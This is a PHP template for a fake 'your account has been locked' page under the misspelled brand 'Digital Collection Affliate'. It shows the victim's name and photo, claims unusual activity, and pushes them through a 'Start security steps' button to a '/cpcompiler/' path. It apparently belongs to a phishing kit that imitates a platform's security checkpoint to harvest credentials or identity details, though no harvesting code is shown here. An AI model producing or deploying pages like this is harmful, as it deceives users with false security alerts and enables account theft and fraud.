<?php require("headers/locked-header.php"); ?>
<div class="hidden-nav">
   <div class="weblogo">
      <a href="/locked">
         <img src="/internal/icon/dca_logo.png" alt="Digital Collection Affliate" draggable="false">
      </a>
   </div>
   <div class="_ekd">
      <div class="prosec">
         <img src="<?=$prosource;?>" alt="<?=$firstname." ".$surname;?>" class="user-profile" draggable="false">
         <strong><?=$firstname;?></strong>
      </div>
      <div class="logged-section">
         <a href="/log/">Logout</a>
      </div>
   </div>
</div>
<div id="content">
   <div class="visdivice">
      <div class="logout"><a href="/log/" class="hover-underline">Logout</a></div>
   </div>
   <div class="clearfix">
      <div class="prevent-logo" style="max-width:120px;margin:0 auto;padding:18px 0;">
         <img src="/internal/images/prevent_access.png" alt="Blocked Illustration" draggable="false">
         <div class="user-profile">
            <img src="<?=$prosource;?>" alt="<?=$firstname." ".$surname;?>" draggable="false">
         </div>
      </div>
   </div>
   <div class="text-content">
      <header>
         <h1><?=$firstname;?>, your account has been locked</h1>
      </header>
      <div class="text">
         <p>We saw unusual activity and locked your account on 23 August 2023. No one will be able to see this Digital collection affliate profile or use the account until you've confirmed that it's yours.</p>
      </div>
   </div>
   <div class="outer-info">
      <div class="details-info">
         <div class="clearfix"><div class="lock-icon">
         <svg width="18" height="18" fill="currentColor" viewBox="0 0 448 512"><path d="M144 144v48H304V144c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192V144C80 64.5 144.5 0 224 0s144 64.5 144 144v48h16c35.3 0 64 28.7 64 64V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V256c0-35.3 28.7-64 64-64H80z"></path></svg>
         </div></div>
         <div class="info-text">
            <strong>Account Locked on <?=$oncheckpoint;?></strong>
            <p>Dear <?=$firstname." ".$surname;?>, Your account has been temporarily locked on <?=$oncheckpoint;?> Please confirm your identity and your account will be unlocked?</p>
         </div>
      </div>
   </div>
   <div class="_24Yd">
      We'll take you through some steps to unlock you account.
   </div>
   <div class="_1BtnYee">
      <button onclick="window.location.href='/cpcompiler/';">Start security steps</button>
   </div>
</div>
<?php require("footer.php"); ?>